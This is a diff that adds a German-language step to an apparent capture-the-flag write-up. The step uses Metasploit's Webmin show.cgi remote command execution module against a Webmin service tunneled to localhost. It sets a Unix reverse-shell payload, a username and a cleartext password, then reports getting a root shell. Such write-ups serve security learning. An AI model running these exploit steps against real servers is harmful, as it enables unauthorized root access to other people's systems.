@@ -218,3 +218,34 @@ Shellcodes: No Results
 
 ```
 
+Wir nehmen hier jetzt dann metasploit 
+
+```
+search webmin 1.580
+
+atching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/webmin/edit_html_fileaccess
+
+```
+
+der Exploit 0 sieht gut aus. Hier müssen wir dann noch Optionen setzen. 
+
+```
+set PAYLOAD payload/cmd/unix/reverse
+set PASSWORDS videogamer124
+set USERNAME agent47
+set RHOSTS 127.0.0.1              #Da wir das ja auf Localhost mit Port 10000 tunneln
+set RPORT 10000
+set SSL false
+```
+
+danach nurnoch `exploit` und wir erhalten die Revshell und bei whoami sehen wir sogar das die shell schon root ist
+
